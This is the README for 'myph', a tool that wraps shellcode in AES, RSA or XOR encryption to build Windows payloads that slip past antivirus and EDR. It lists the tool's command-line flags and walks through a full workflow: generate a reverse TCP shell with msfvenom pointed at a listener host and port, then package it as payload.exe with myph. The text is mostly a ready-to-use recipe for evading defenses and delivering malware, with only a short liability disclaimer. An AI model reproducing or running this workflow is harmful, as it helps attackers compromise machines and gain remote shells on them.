# myph

AV/EDR bypass payload creation tool

## Disclaimer

The access to and the use of the information on this repository is free of charge,
but implies the tacit acceptance by the user of the following conditions, without prejudice to the applicable legal provisions.
The user acknowledges that this repository is intended for informational purposes only and therefore serves only
for general information and testing. The tool and this repository are carefully compiled on the basis of good sources and references.

However, the developers cannot be held liable for for any damage, direct or indirect, of whatever nature as a result of
or related to the access to or use of the software.

## Usage

```bash
myph --help
In loving memory of Wassyl Iaroslavovytch Slipak (1974 - 2016)

Usage:
  myph [flags]

Flags:
  -r, --arch string          architecture compilation target (default "amd64")
  -e, --encryption encKind   encryption method. (allowed: AES, RSA, XOR) (default AES)
  -h, --help                 help for myph
  -k, --key string           encryption key, auto-generated if empty. (if used by --encryption-method)
  -o, --os string            OS compilation target (default "windows")
  -f, --outdir string        output directory (default "myph-out")
  -s, --shellcode string     shellcode path (default "msf.raw")
  -v, --version              version for myph
```


This tool uses the CRT method. If you don't know what that is, go check out [this repository](https://github.com/CMEPW/BypassAV) :)~

Generate a payload like so:

```bash
# generate your payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.2 LPORT=1234 -f raw -o msf.raw

# run myph (--shellcode is not mandatory here because we use the default value)
./myph --shellcode msf.raw --outdir something

# you should find your payload here
file ./something/payload.exe
```
